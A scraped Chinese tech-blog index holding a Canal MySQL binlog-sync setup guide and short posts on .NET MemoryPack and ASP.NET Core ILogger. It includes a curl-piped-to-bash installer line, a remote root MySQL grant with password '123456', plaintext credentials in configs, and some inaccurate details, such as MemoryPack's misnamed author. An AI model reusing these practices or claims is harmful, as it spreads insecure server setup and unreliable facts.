release.\nUnrecognized VM option \u0026lsquo;UseCMSCompactAtFullCollection\u0026rsquo; Error: Could not create the Java Virtual Machine. Error: A fatal exception has occurred. Program will exit.\n出现此报错的原因是由于当前服务器安装的jdk版本高于jdk8，此时需要修改 startup.sh 的启动参数，操作如下：\ncd /usr/local/canal/canal-deployer/bin ./stop.sh vi startup.sh\n删除 -XX:+UseCMSCompactAtFullCollection -XX:+UseFastAccessorMethods 参数 ./startup.sh\nUnrecognized VM option \u0026lsquo;UseBiasedLocking\u0026rsquo; Error: Could not create the Java Virtual Machine. Error: A fatal exception has occurred. Program will exit.\n移除 UseBiasedLocking 选项 -XX:+UseBiasedLocking\nUnrecognized VM option \u0026lsquo;AggressiveOpts\u0026rsquo; Error: Could not create the Java Virtual Machine. Error: A fatal exception has occurred. Program will exit.\nRemove -XX:+AggressiveOpts canal.deployer-1.1.8-SNAPSHOT.tar.gz\ncom.alibaba.druid.pool.DruidDataSource 类未找到，导致 Canal 的 dataSource bean 初始化失败。\n./startup.sh\n若需要同步某几张表，可以参考如下配置 同步某数据库test1下的user表,test2数据库下的所有表，所有库下所有表数据 canal.instance.filter.regex=test1.user,test2\\\\..*,.*\\\\..* 启动canal-deployer cd /usr/local/canal/canal-deployer/bin ./startup.sh 查看日志确定是否启动成功\ncd /usr/local/canal/canal-deployer/logs/example cat example.log log内容\u0026hellip; [main] INFO c.a.otter.canal.instance.core.AbstractCanalInstance - stop CannalInstance for null-example [main] INFO c.a.otter.canal.instance.core.AbstractCanalInstance - stop successful\u0026hellip;. 启动\n启动canal需要jdk 安装 OpenJDK\nsudo apt update apt search openjdk sudo apt install openjdk-17-jdk sudo apt install -y openjdk-17-jdk 手动下载并安装 前往 Oracle JDK 下载页面，下载最新的 .tar.gz 包。 https://www.oracle.com/java/technologies/downloads/?er=221886 下载完成后，解压缩文件：\ntar -xvzf jdk-\u0026lt;version\u0026gt;-linux-x64_bin.tar.gz 将 JDK 移动到 /opt 目录：\nsudo mv jdk-\u0026lt;version\u0026gt; /opt/ 配置环境变量。在 ~/.bashrc 中添加以下内容：\nexport JAVA_HOME=/opt/jdk-\u0026lt;version\u0026gt; export PATH=$JAVA_HOME/bin:$PATH 使配置生效：\nsource ~/.bashrc 验证安装,确认安装成功，检查 Java 版本：\njava -version 卸载jdk\ndpkg --list | grep -i jdk 一旦知道了要卸载的JDK包的确切名称，使用apt-get命令卸载它：\nsudo apt-get remove your-jdk-package-name 将your-jdk-package-name替换为从列表中找到的实际JDK包名称。 如果想同时删除配置文件，可以使用\u0026ndash;purge选项：\nsudo apt-get purge your-jdk-package-name 最后，运行autoremove来清除系统中不再需要的依赖项：\nsudo apt-get autoremove 例如，如果安装的是OpenJDK 11，并且通过apt安装，可以使用以下命令来卸载：\nsudo apt-get remove openjdk-11-jdk sudo apt-get autoremove canal-deployer 和 canal-adapter 是 Canal 的两个独立模块，各自承担不同的功能： canal-deployer **功能：**canal-deployer 是 Canal 的核心组件，用于从 MySQL 数据库中读取 binlog，并解析 binlog 事件。 **作用：**主要负责数据的实时捕获和解析。它将从 MySQL 实例捕获的 binlog 数据转换成 Canal 可以处理的格式，并通过网络或其他方式将这些数据推送给下游消费者。 **配置：**canal-deployer 需要配置连接信息（如 MySQL 的地址、用户名、密码等）以及相关的过滤条件，比如要监控的表和过滤的字段。 **应用场景：**适用于需要捕获 MySQL 数据变更的场景，比如数据库的实时增量数据同步和数据监控。\ncanal-adapter **功能：**canal-adapter 负责将 Canal 捕获并解析的数据，适配并同步到不同的下游目标。 **作用：**可以将数据写入到 ElasticSearch、Kafka、HBase 等多种目标，起到数据同步的桥梁作用。 **配置：**canal-adapter 提供了丰富的适配器配置（如 ES、Kafka、RocketMQ 等），可以根据业务需求配置同步的字段映射、数据转换和过滤规则。 **应用场景：**适用于需要将 MySQL 的 binlog 数据实时同步到其他数据存储或消息队列的场景，比如数据仓库同步、实时索引等。\n总结 canal-deployer 专注于从 MySQL 读取并解析 binlog 数据。 canal-adapter 则将解析后的数据推送或同步到下游目标，起到数据适配和转换的作用。\n配置和启动canal-adapter 配置canal-adapter 修改application.yml文件\ncd /usr/local/canal/canal-adapter/conf vi application.yml # canal tcp consumer # 修改位置：Canal deployer所在主机IP canal.tcp.server.host: 192.168.91.135:11111 修改位置：添加源库配置信息，此处为同步同库下所有表信息\nsrcDataSources: defaultDS: url: jdbc:mysql://124.219.119.xxx:3306/IMDB?useUnicode=true\u0026amp;characterEncoding=utf8mb4\u0026amp;autoReconnect=true\u0026amp;useSSL=false username: root password: 123123.xx canalAdapters: - instance: example # canal instance Name or mq topic name groups: - groupId: g1 outerAdapters: - name: logger - name: rdb key: mysql1 properties: jdbc.driverClassName: com.mysql.jdbc.Driver jdbc.url: jdbc:mysql://192.168.80.xxx/IMDB?useUnicode=true\u0026amp;characterEncoding=utf8mb4\u0026amp;autoReconnect=true\u0026amp;useSSL=false jdbc.username: root jdbc.password: 123123.xx 说明:\n其中 outAdapter 的配置: name统一为rdb, key为对应的数据源的唯一标识需和下面的表映射文件中的outerAdapterKey对应, properties为目标库jdbc的相关参数\nadapter将会自动加载 conf/rdb 下的所有.yml结尾的表映射配置文件\n修改canal-adapter/conf/rdb文件夹下的yml文件 说明：canal-adapter/conf/rdb文件夹下的yml文件可以同步数据库下的一张表，也可以同步数据库下的所有表(此处的前提是：同步数据的数据库与主库的schema一致)\ncd /usr/local/canal/canal-adapter/conf/rdb .yml ## Mirror schema synchronize config dataSourceKey: defaultDS destination: example groupId: g1 outerAdapterKey: mysql1 concurrent: true dbMapping: mirrorDb: true database: test 启动canal-adapter cd /usr/local/canal/canal-adapter/bin ./startup.sh 查看日志信息，确保正常启动。\ncd /usr/local/canal/canal-adapter/logs/adapter cat adapter.log log err [main] ERROR org.springframework.boot.SpringApplication - Application run failed org.yaml.snakeyaml.error.YAMLException:\n如果没有log 或启动不成功\n移除未支持的 JVM 参数 -XX:+UseFastAccessorMethods -XX:+PrintAdaptiveSizePolicy -XX:+PrintTenuringDistribution\n参考1\n去掉 -XX:+AggressiveOpts -XX:-UseBiasedLocking -XX:+UseFastAccessorMethods\n去掉 str=file -L $JAVA | grep 64-bit\nJAVA_OPTS=\u0026quot;$JAVA_OPTS -Xss1m -XX:-OmitStackTraceInFastThrow -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=$base/logs\u0026quot; if [ $JavaVersion -ge 11 ] ; then #JAVA_OPTS=\u0026quot;$JAVA_OPTS -Xlog:gc*:$base_log/gc.log:time \u0026quot; JAVA_OPTS=\u0026quot;$JAVA_OPTS\u0026quot; else #JAVA_OPTS=\u0026quot;$JAVA_OPTS -Xloggc:$base/logs/canal/gc.log -XX:+PrintGCDetails -XX:+PrintGCDateStamps -XX:+PrintGCApplicationStoppedTime\u0026quot; JAVA_OPTS=\u0026quot;$JAVA_OPTS -XX:+PrintAdaptiveSizePolicy -XX:+PrintTenuringDistribution\u0026quot; fi\n#!/bin/bash current_path=`pwd` case \u0026#34;`uname`\u0026#34; in Linux) bin_abs_path=$(readlink -f $(dirname $0)) ;; *) bin_abs_path=`cd $(dirname $0); pwd` ;; esac base=${bin_abs_path}/.. export LANG=en_US.UTF-8 export BASE=$base if [ -f $base/bin/adapter.pid ] ; then echo \u0026#34;found adapter.pid , Please run stop.sh first ,then startup.sh\u0026#34; 2\u0026gt;\u0026amp;2 exit 1 fi if [ ! -d $base/logs ] ; then mkdir -p $base/logs fi ## set java path if [ -z \u0026#34;$JAVA\u0026#34; ] ; then JAVA=$(which java) fi ALIBABA_JAVA=\u0026#34;/usr/alibaba/java/bin/java\u0026#34; TAOBAO_JAVA=\u0026#34;/opt/taobao/java/bin/java\u0026#34; if [ -z \u0026#34;$JAVA\u0026#34; ]; then if [ -f $ALIBABA_JAVA ] ; then JAVA=$ALIBABA_JAVA elif [ -f $TAOBAO_JAVA ] ; then JAVA=$TAOBAO_JAVA else echo \u0026#34;Cannot find a Java JDK. Please set either set JAVA or put java (\u0026gt;=1.5) in your PATH.\u0026#34; 2\u0026gt;\u0026amp;2 exit 1 fi fi case \u0026#34;$#\u0026#34; in 0 ) ;; 2 ) if [ \u0026#34;$1\u0026#34; = \u0026#34;debug\u0026#34; ]; then DEBUG_PORT=$2 DEBUG_SUSPEND=\u0026#34;n\u0026#34; JAVA_DEBUG_OPT=\u0026#34;-Xdebug -Xnoagent -Djava.compiler=NONE -Xrunjdwp:transport=dt_socket,address=$DEBUG_PORT,server=y,suspend=$DEBUG_SUSPEND\u0026#34; fi ;; * ) echo \u0026#34;THE PARAMETERS MUST BE TWO OR LESS.PLEASE CHECK AGAIN.\u0026#34; exit;; esac JavaVersion=`$JAVA -version 2\u0026gt;\u0026amp;1 |awk \u0026#39;NR==1{ gsub(/\u0026#34;/,\u0026#34;\u0026#34;); print $3 }\u0026#39; | awk -F \u0026#39;.\u0026#39; \u0026#39;{print $1}\u0026#39;` str=`file -L $JAVA | grep 64-bit` JAVA_OPTS=\u0026#34;$JAVA_OPTS -Xss1m -XX:-UseBiasedLocking -XX:-OmitStackTraceInFastThrow -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=$base/logs\u0026#34; if [ $JavaVersion -ge 11 ] ; then #JAVA_OPTS=\u0026#34;$JAVA_OPTS -Xlog:gc*:$base_log/gc.log:time \u0026#34; JAVA_OPTS=\u0026#34;$JAVA_OPTS\u0026#34; else #JAVA_OPTS=\u0026#34;$JAVA_OPTS -Xloggc:$base/logs/canal/gc.log -XX:+PrintGCDetails -XX:+PrintGCDateStamps -XX:+PrintGCApplicationStoppedTime\u0026#34; -XX:+UseFastAccessorMethods -XX:+PrintAdaptiveSizePolicy -XX:+PrintTenuringDistribution JAVA_OPTS=\u0026#34;$JAVA_OPTS\u0026#34; fi if [ -n \u0026#34;$str\u0026#34; ]; then if [ $JavaVersion -ge 11 ] ; then # For G1 JAVA_OPTS=\u0026#34;-server -Xms2g -Xmx3g -XX:+UseG1GC -XX:MaxGCPauseMillis=200 -XX:+UseGCOverheadLimit $JAVA_OPTS\u0026#34; else JAVA_OPTS=\u0026#34;-server -Xms2g -Xmx3g -XX:+UseG1GC -XX:MaxGCPauseMillis=200 -XX:+UseGCOverheadLimit $JAVA_OPTS\u0026#34; fi else JAVA_OPTS=\u0026#34;-server -Xms2g -Xmx3g -XX:+UseG1GC -XX:MaxGCPauseMillis=200 -XX:+UseGCOverheadLimit $JAVA_OPTS\u0026#34; fi JAVA_OPTS=\u0026#34; $JAVA_OPTS -Djava.awt.headless=true -Djava.net.preferIPv4Stack=true -Dfile.encoding=UTF-8\u0026#34; ADAPTER_OPTS=\u0026#34;-DappName=canal-adapter\u0026#34; for i in $base/lib/*; do CLASSPATH=$i:\u0026#34;$CLASSPATH\u0026#34;; done CLASSPATH=\u0026#34;$base/conf:$CLASSPATH\u0026#34;; echo \u0026#34;cd to $bin_abs_path for workaround relative path\u0026#34; cd $bin_abs_path echo CLASSPATH :$CLASSPATH $JAVA $JAVA_OPTS $JAVA_DEBUG_OPT $ADAPTER_OPTS -classpath .:$CLASSPATH com.alibaba.otter.canal.adapter.launcher.CanalAdapterApplication 1\u0026gt;\u0026gt;/dev/null 2\u0026gt;\u0026amp;1 \u0026amp; echo $! \u0026gt; $base/bin/adapter.pid echo \u0026#34;cd to $current_path for continue\u0026#34; cd $current_path ./startup.sh\n启动成功log\n2024-11-15 16:43:42.033 [main] INFO c.a.o.canal.adapter.launcher.loader.CanalAdapterLoader - Start adapter for canal-client mq topic: example-g1 succeed 2024-11-15 16:43:42.034 [main] INFO c.a.o.canal.adapter.launcher.loader.CanalAdapterService - ## the canal client adapters are running now \u0026hellip;\u0026hellip; 2024-11-15 16:43:42.035 [Thread-3] INFO c.a.otter.canal.adapter.launcher.loader.AdapterProcessor - =============\u0026gt; Start to connect destination: example \u0026lt;============= 2024-11-15 16:43:42.047 [main] INFO c.a.otter.canal.adapter.launcher.CanalAdapterApplication - Started CanalAdapterApplication in 1.721 seconds (JVM running for 2.038) 2024-11-15 16:43:42.109 [Thread-3] INFO c.a.otter.canal.adapter.launcher.loader.AdapterProcessor - =============\u0026gt; Subscribe destination: example succeed \u0026lt;=============\n插入原sql则可以看到 canal的数据库也插入 在主库test数据库下的user表中插入数据，查看canal所在数据库test下的user表中是否同步。\nCanal 依赖主键或唯一键来确定同步数据 如果有新增唯一键，则也需要bak到备份的数据库中才能正确备份\n总结 mkdir -p /usr/local/canal/canal-deployer mkdir -p /usr/local/canal/canal-adapter tar -zxvf canal.deployer-1.1.8-SNAPSHOT.tar.gz -C /usr/local/canal/canal-deployer tar -zxvf canal.adapter-1.1.8-SNAPSHOT.tar.gz -C /usr/local/canal/canal-adapter 先启动deployer再启动动adapter\ndataSourceKey: defaultDS destination: example groupId: g1 outerAdapterKey: mysql1 concurrent: true dbMapping: mirrorDb: true database: IMDB ## Mirror schema synchronize config #dataSourceKey: defaultDS #destination: example #groupId: g1 #outerAdapterKey: mysql1 #concurrent: true #dbMapping: # mirrorDb: true # database: mytest JDK17 debian 安装jdk17 在 Debian 系统上安装 JDK 17，可以通过多种方式来完成，包括使用 Debian 的官方仓库、OpenJDK 的官方 PPA 仓库或者手动下载和安装。下面是一些常见的方法：\n方法 1：使用 Debian 的官方仓库 更新的包列表：\nsudo apt update 安装 OpenJDK 17：\nsudo apt install openjdk-17-jdk 方法 2：使用 OpenJDK 的官方 PPA 仓库 导入 OpenJDK 的 PPA 密钥：\nsudo apt install software-properties-common sudo add-apt-repository ppa:openjdk-r/ppa 更新包列表：\nsudo apt update 安装 OpenJDK 17：\nsudo apt install openjdk-17-jdk 方法 3：手动下载和安装 JDK 17 访问 Oracle 的官方网站或 AdoptOpenJDK 下载页面，下载 JDK 17 的 .tar.gz 文件。例如，从 Oracle 官网下载：\n访问 Oracle JDK 下载页面。\n选择适合系统的版本，例如 jdk-17_linux-x64_bin.tar.gz。\n下载文件（例如使用 wget）：\nwget https://download.oracle.com/java/17/latest/jdk-17_linux-x64_bin.tar.gz 解压文件：\nsudo mkdir -p /usr/lib/jvm sudo tar -xvzf jdk-17_linux-x64_bin.tar.gz -C /usr/lib/jvm/ 设置环境变量（可选，但推荐）：\n打开或创建 ~/.bashrc 或 ~/.profile 文件，并添加以下行：\nexport JAVA_HOME=/usr/lib/jvm/jdk-17 export PATH=$PATH:$JAVA_HOME/bin 应用更改：\nsource ~/.bashrc 或者重新登录的会话。\n验证安装：\njava -version 应该看到 JDK 17 的版本信息。\n方法 4：使用 sdkman (SDK Man for the Management of Software) 如果倾向于使用一个工具来管理多个 Java 版本，可以使用 sdkman。\n安装 SDKMAN：\ncurl -s \u0026#34;https://get.sdkman.io\u0026#34; | bash source \u0026#34;$HOME/.sdkman/bin/sdkman-init.sh\u0026#34; 安装 JDK 17：\nsdk install java 17.0.1-open （注意版本号可能随时间变化，请检查最新版本）\n使用 SDKMAN 设置默认 Java 版本（可选）：\nsdk use java 17.0.1-open 或者设置为全局默认：\nsdk default java 17.0.1-open mysql-bin 查看当前的 binlog 文件名和位置\n--sql SHOW MASTER STATUS; File\tPosition mysql-bin.000003\t120 记下这个 File 和 Position，从服务器配置时要用。\nSHOW MASTER STATUS 和 SHOW SLAVE STATUS 命令被标记为​​弃用​​（deprecated）\n并在新版本中逐步移除。若你的 MySQL 版本 ≥ 8.0.26，执行该命令会触发语法错误。 替代命令：​\n​SHOW BINARY LOG STATUS; mysql-bin.000001,position=4,serverId=1\n“Unsupported character encoding \u0026lsquo;utf8mb4\u0026rsquo;” Canal Adapter JDBC 驱动升级完整步骤（解决 “Unsupported character encoding \u0026lsquo;utf8mb4\u0026rsquo;” 错误） 在使用 Canal Adapter 同步数据时，若出现 java.io.UnsupportedEncodingException: utf8mb4 错误，通常是由于旧版本 MySQL JDBC 驱动不支持 utf8mb4 编码导致。以下是完整的驱动升级步骤，确保升级后可正常使用 utf8mb4 编码。\n1. 确认 Canal Adapter 安装目录 首先明确 Canal Adapter 的部署路径，后续操作均基于此路径展开。 假设默认安装目录：/usr/local/canal/canal-adapter 核心子目录：/usr/local/canal/canal-adapter/lib 该目录存放所有第三方依赖 JAR 包，包括待升级的 MySQL JDBC 驱动。\n2. 下载最新版 MySQL Connector/J（JDBC 驱动） 推荐使用 8.0.33 及以上版本，新版本已完全支持 utf8mb4 编码。 下载步骤： 访问 MySQL 官方下载页：MySQL Connector/J 下载 选择 Platform Independent 版本（跨平台通用） 点击 Download，在弹出的页面中选择 No thanks, just start my download 直接下载（无需注册）\nhttps://dev.mysql.com/downloads/connector/j/\n下载后文件： 下载文件为压缩包，例如：mysql-connector-java-8.0.33.tar.gz 解压压缩包：\ntar -zxvf mysql-connector-java-8.0.33.tar.gz 解压后得到驱动 JAR 文件：mysql-connector-java-8.0.33/mysql-connector-java-8.0.33.jar\n3. 停止 Canal Adapter 服务 升级驱动前需停止 Canal Adapter，避免文件占用导致替换失败。\n# 进入 Canal Adapter 二进制执行目录 cd /usr/local/canal/canal-adapter/bin # 停止服务 ./stop.sh 可通过 ps -ef | grep canal-adapter 命令验证服务是否已停止（无对应进程则表示停止成功）。\n解压.deb 使用 dpkg-deb 解包\n进入下载目录：\ncd /path/to/download 解包到当前目录下的 mysql-connector-j 文件夹：\ndpkg-deb -x mysql-connector-j_8.4.0-1debian12_all.deb mysql-connector-j 查找 jar 文件：\nfind mysql-connector-j -name \u0026#34;*.jar\u0026#34; 看到类似：\nmysql-connector-j/usr/share/java/mysql-connector-java-8.4.0.jar 复制 jar 到 Canal Adapter 的 lib 目录：\ncp mysql-connector-j/usr/share/java/mysql-connector-java-8.4.0.jar \\ /usr/local/canal/canal-adapter/lib/ 4. 备份并删除旧版 MySQL 驱动 备份并删除旧驱动：\n# 备份旧驱动（添加 .bak 后缀，便于回滚） mv mysql-connector-java-5.1.48.jar mysql-connector-java-5.1.48.jar.bak UTF-8 改为utf-8 adapter app.yaml\nsrcDataSources: defaultDS: url: jdbc:mysql://8.138.xxxxx306/IDB?useUnicode=true\u0026amp;characterEncoding=UTF-8\u0026amp;autoReconnect=true\u0026amp;allowPublicKeyRetrieval=true\u0026amp;useSSL=false username: root password: 123123 canalAdapters: - instance: example # canal instance Name or mq topic name groups: - groupId: g1 outerAdapters: - name: logger - name: rdb key: mysql1 properties: jdbc.driverClassName: com.mysql.jdbc.Driver jdbc.url: jdbc:mysql://185.242.xxx.xx:3306/IDB?useUnicode=true\u0026amp;characterEncoding=UTF-8\u0026amp;autoReconnect=true\u0026amp;allowPublicKeyRetrieval=true\u0026amp;useSSL=false jdbc.username: root jdbc.password: 123123 5.重启 # 进入二进制执行目录 cd /usr/local/canal/canal-adapter/bin # 启动服务 ./start.sh 注意： 要开放端口 11111\n/usr/local/canal/canal-deployer/logs/example log\njournalName=mysql-bin.000001,position=8608,serverId=1 与\n/usr/local/canal/canal-deployer/conf/example instance.properties\n# position info canal.instance.master.address=8.138.xx.xx:3306 canal.instance.master.journal.name=mysql-bin.000001 canal.instance.master.position=8770 ··· ","permalink":"https://qfsyso.github.io/posts/canal-mysql-auto-bak/","summary":"Canal 是阿里巴巴开源的一个数据库binlog解析工具，它能够捕获并解析MySQL等数据库的增量数据变化（即binlog），然后将这些变化的数据以消息的形式发送给其他系统或服务，如Elasticsearch、HBase、Redis等。这样做的好处是可以实现数据的实时同步，保证不同存储系统之间的数据一致性。\nCanal的设计理念主要是基于数据库的增量订阅与消费模式，它通过模拟MySQL的slave来实现对MySQL主库binlog的监听，当主库有数据更新时，Canal能及时捕捉到这些变化，并将变化的数据按照一定的格式输出，供下游系统消费使用。\n使用Canal的主要优势包括： 实时性 Canal通过模仿MySQL的slave节点行为，向MySQL master节点发送dump协议请求，以获取binlog日志8。这种方法使得Canal能够以较低的延迟捕获到数据库的变化，从而实现实时的数据同步。对于需要保持数据最新性的应用场景，如搜索引擎的索引更新或缓存系统的数据刷新，这一特性尤为重要。\n解耦 Canal作为一个独立的服务，充当了数据库和数据消费者之间的中介角色。它不仅减少了直接连接数据库带来的性能压力，还避免了因数据库结构或数据模型变更导致的下游系统适配问题。这种解耦机制增强了系统的灵活性和可维护性，使得各个组件可以独立发展而不相互干扰18。\n灵活性 Canal支持多种数据输出格式，包括但不限于JSON、XML等，这使得它可以很容易地与其他数据处理工具和服务集成。此外，Canal还提供了对Kafka、RocketMQ等消息队列的支持，这意味着数据不仅可以被同步到不同的存储系统，还可以被发送到消息队列中，供更多的应用和服务消费14。\n除了上述提到的优点外，Canal还具备以下特点：\n**高性能：**经过优化的Canal能够在高并发环境下保持稳定的性能表现，适合大规模数据同步场景。 **低延迟：**通过高效的日志解析和数据传输机制，Canal能够确保数据从源头到目的地的传输延迟尽可能低。 **高可用性：**Canal支持集群部署，结合Zookeeper等协调服务，可以实现故障自动切换，保证服务的连续性和稳定性21。 **安全性：**Canal可以通过配置SSL/TLS加密通信，保护数据在传输过程中的安全18。\n应用场景 Canal的应用场景非常广泛，包括但不限于：\n**数据同步：**将MySQL数据库的数据同步到Elasticsearch、Redis等其他存储系统，用于构建搜索引擎、缓存层等18。 **数据备份：**定期或实时备份MySQL数据库的数据，用于灾难恢复或数据归档18。 **数据集成：**在微服务架构中，使用Canal将多个数据库中的数据进行集成，提供统一的数据视图18。 **数据监控：**通过监听数据库的变化，及时发现异常操作或潜在的安全风险18。 Canal是一个功能强大、灵活多变的数据同步工具，它在保证数据实时性和一致性的基础上，提供了丰富的特性和广泛的应用场景，是现代数据驱动应用的理想选择。\nCanal环境准备 设置MySQL远程访问\ngrant all privileges on *.* to \u0026#39;root\u0026#39;@\u0026#39;%\u0026#39; identified by \u0026#39;123456\u0026#39;; flush privileges; MySQL配置\nCanal的原理基于MySQL binlog技术，所以，要想使用Canal就要开启MySQL的binlog写入功能，建议配置binlog的模式为row。\n可以在MySQL命令行输入如下命令来查看binlog的模式。\nSHOW VARIABLES LIKE \u0026#39;binlog_format\u0026#39;; 如果MySQL中默认的binlog格式为STATEMENT，需要将STATEMENT修改为ROW。修改/etc/my.cnf文件。\n/etc/my.cnf 在[mysqld]下面新增如下三项配置。\nlog-bin=mysql-bin #开启MySQL二进制日志 binlog_format=ROW #将二进制日志的格式设置为ROW server_id=1 #server_id需要唯一，不能与Canal的slaveId重复 修改完my.cnf文件后，需要重启MySQL服务。\nservice mysqld restart 再次查看binlog模式。\nSHOW VARIABLES LIKE \u0026#39;binlog_format\u0026#39;; MySQL创建用户授权\nCanal的原理是模式自己为MySQL Slave，所以一定要设置MySQL Slave的相关权限。这里，需要创建一个主从同步的账户，并且赋予这个账户相关的权限。\nCREATE USER canal@\u0026#39;localhost\u0026#39; IDENTIFIED BY \u0026#39;canal\u0026#39;; GRANT SELECT, REPLICATION SLAVE, REPLICATION CLIENT ON *.","title":"canal mysql auto bak"},{"content":"MemoryPack 是一个高效的数据序列化库，它专注于性能优化，适用于需要快速序列化和反序列化的场景。这个库是由 Yuki Yogo 开发的，并且在 .NET 社区中获得了相当的关注。MemoryPack 支持零拷贝（zero-copy）读取，这意味着可以在不需要额外内存分配的情况下直接从原始字节数据中读取值。\nMemoryPack使用示例，包括定义一个可序列化的类、序列化对象以及反序列化回对象的过程。\n安装 MemoryPack 首先，需要安装 MemoryPack 库。可以通过 NuGet 包管理器来安装：\ndotnet add package MemoryPack 或者在 Visual Studio 中使用 NuGet 包管理器界面来安装。\n定义可序列化的类 为了使一个类能够被 MemoryPack 序列化，需要为该类添加 [MemoryPackable] 属性，并为类中的每个字段或属性添加 [MemoryPackIgnore] 属性（如果想要忽略某些字段或属性的话）。这里有一个简单的例子：\nusing System; using MemoryPack; [MemoryPackable] public partial class Person { public string Name { get; set; } public int Age { get; set; } [MemoryPackIgnore] public string NotSerializedProperty { get; set; } } 注意：partial 关键字是必须的，因为 MemoryPack 在编译时会生成一些额外的代码来支持序列化/反序列化。\n序列化和反序列化 接下来，我们可以创建一个 Person 对象，然后使用 MemoryPack 将其序列化为字节数组，再从字节数组反序列化回 Person 对象。\nusing System; using MemoryPack; class Program { static void Main() { // 创建一个 Person 实例 var person = new Person { Name = \u0026#34;John Doe\u0026#34;, Age = 30, NotSerializedProperty = \u0026#34;This will not be serialized\u0026#34; }; // 序列化 byte[] serialized = MemoryPackSerializer.Serialize(person); // 反序列化 （零拷贝） Person deserializedPerson = MemoryPackSerializer.Deserialize\u0026lt;Person\u0026gt;(serialized); // 输出结果 Console.WriteLine($\u0026#34;Name: {deserializedPerson.Name}, Age: {deserializedPerson.Age}\u0026#34;); // 注意：NotSerializedProperty 不会被输出，因为它没有被序列化 } } 注意事项 MemoryPack 支持大多数基本类型和复杂类型，但是也有一些限制，例如不支持循环引用的对象图。 如果的项目中存在多个需要序列化的类，每个类都需要标记 [MemoryPackable] 并且是 partial 类型。 由于 MemoryPack 使用了源生成器（source generators），因此它在编译时会生成额外的代码，这可能会稍微增加构建时间，但可以显著提高运行时的性能。 以上就是一个使用 MemoryPack 进行序列化和反序列化的简单示例。\n","permalink":"https://qfsyso.github.io/posts/.net-memorypack/","summary":"MemoryPack 是一个高效的数据序列化库，它专注于性能优化，适用于需要快速序列化和反序列化的场景。这个库是由 Yuki Yogo 开发的，并且在 .NET 社区中获得了相当的关注。MemoryPack 支持零拷贝（zero-copy）读取，这意味着可以在不需要额外内存分配的情况下直接从原始字节数据中读取值。\nMemoryPack使用示例，包括定义一个可序列化的类、序列化对象以及反序列化回对象的过程。\n安装 MemoryPack 首先，需要安装 MemoryPack 库。可以通过 NuGet 包管理器来安装：\ndotnet add package MemoryPack 或者在 Visual Studio 中使用 NuGet 包管理器界面来安装。\n定义可序列化的类 为了使一个类能够被 MemoryPack 序列化，需要为该类添加 [MemoryPackable] 属性，并为类中的每个字段或属性添加 [MemoryPackIgnore] 属性（如果想要忽略某些字段或属性的话）。这里有一个简单的例子：\nusing System; using MemoryPack; [MemoryPackable] public partial class Person { public string Name { get; set; } public int Age { get; set; } [MemoryPackIgnore] public string NotSerializedProperty { get; set; } } 注意：partial 关键字是必须的，因为 MemoryPack 在编译时会生成一些额外的代码来支持序列化/反序列化。","title":" .NET MemoryPack"},{"content":"ILogger 是 ASP.NET Core 中的一个接口，用于记录应用程序的日志信息。它是一个泛型接口，其中 T 是日志记录的上下文类型。通常情况下，会使用 ILogger 接口而不是 ILogger，除非需要将特定的上下文类型传递给日志记录器。\nILogger 的示例：\n1. 注入 ILogger 在的控制器、服务或其他依赖注入组件中，可以注入 ILogger 或 ILogger。例如，在控制器中注入 ILogger：\npublic class YourController : ControllerBase { private readonly ILogger\u0026lt;YourController\u0026gt; _logger; public YourController(ILogger\u0026lt;YourController\u0026gt; logger) { _logger = logger; } // ... } 或者，如果不需要特定的上下文类型，可以注入 ILogger：\npublic class YourService { private readonly ILogger _logger; public YourService(ILogger logger) { _logger = logger; } // ... } 2. 记录日志 使用 _logger 对象记录不同级别的日志，例如：\n_logger.LogInformation(\u0026#34;This is an information message.\u0026#34;); _logger.LogWarning(\u0026#34;This is a warning message.\u0026#34;); _logger.LogError(\u0026#34;This is an error message.\u0026#34;, exception); 3. 配置日志记录 在 appsettings.json 或其他配置文件中配置日志记录级别和输出目标。例如，在 appsettings.Development.json 中：\n{ \u0026#34;Logging\u0026#34;: { \u0026#34;LogLevel\u0026#34;: { \u0026#34;Default\u0026#34;: \u0026#34;Debug\u0026#34;, \u0026#34;System\u0026#34;: \u0026#34;Information\u0026#34;, \u0026#34;Microsoft\u0026#34;: \u0026#34;Warning\u0026#34; } } } 这将设置默认日志级别为 Debug，系统日志级别为 Information，Microsoft 日志级别为 Warning。\n还可以配置日志记录器将日志输出到控制台、文件或其他目标。例如，在 appsettings.json 中：\n{ \u0026#34;Logging\u0026#34;: { \u0026#34;Console\u0026#34;: { \u0026#34;IncludeScopes\u0026#34;: false, \u0026#34;Debug\u0026#34;: { \u0026#34;LogLevel\u0026#34;: { \u0026#34;Default\u0026#34;: \u0026#34;Information\u0026#34; } }, \u0026#34;Info\u0026#34;: { \u0026#34;LogLevel\u0026#34;: { \u0026#34;Default\u0026#34;: \u0026#34;Warning\u0026#34; } }, \u0026#34;Warning\u0026#34;: { \u0026#34;LogLevel\u0026#34;: { \u0026#34;Default\u0026#34;: \u0026#34;Error\u0026#34; } }, \u0026#34;Error\u0026#34;: { \u0026#34;LogLevel\u0026#34;: { \u0026#34;Default\u0026#34;: \u0026#34;Critical\u0026#34; } } } } } 这将配置控制台日志记录器，并为不同级别的日志设置不同的输出级别。\n总之，ILogger 和 ILogger 提供了一种灵活且强大的方式来记录应用程序的日志信息。通过配置不同的日志级别和输出目标，可以轻松地满足各种日志记录需求。\n日志级别和分类： ILogger 提供了日志级别的概念，如 Trace、Debug、Info、Warning、Error 和 Critical。这允许开发者根据需要记录不同严重程度的信息，并且可以在配置中设置日志级别，以便在不同环境中（如开发、测试、生产）显示或隐藏某些级别的日志。 Console.WriteLine 只是简单地将文本输出到控制台，没有日志级别的概念。\n可配置性： ILogger 是可配置的，可以配置日志记录器将日志输出到不同的目标（如文件、数据库、网络服务等），并且可以设置不同的格式化选项。 Console.WriteLine 只是将输出发送到控制台，没有可配置的输出目标或格式化选项。\n结构化日志： ILogger 支持结构化日志记录，这意味着可以记录包含键值对的对象，这些对象可以更容易地被日志分析工具解析和查询。 Console.WriteLine 只能输出文本字符串，不支持结构化日志。\n集成和扩展性： ILogger 是 ASP.NET Core 和许多其他 .NET 应用程序框架的一部分，它与其他框架组件（如依赖注入、中间件等）集成良好，并且可以通过第三方库轻松扩展。 Console.WriteLine 是 .NET 基础类库的一部分，但它不特定于任何特定的应用程序框架，也没有集成的概念。\n异常处理： 使用 ILogger 记录异常时，可以将异常对象作为参数传递，这样日志记录器可以捕获并记录异常的详细信息。 Console.WriteLine 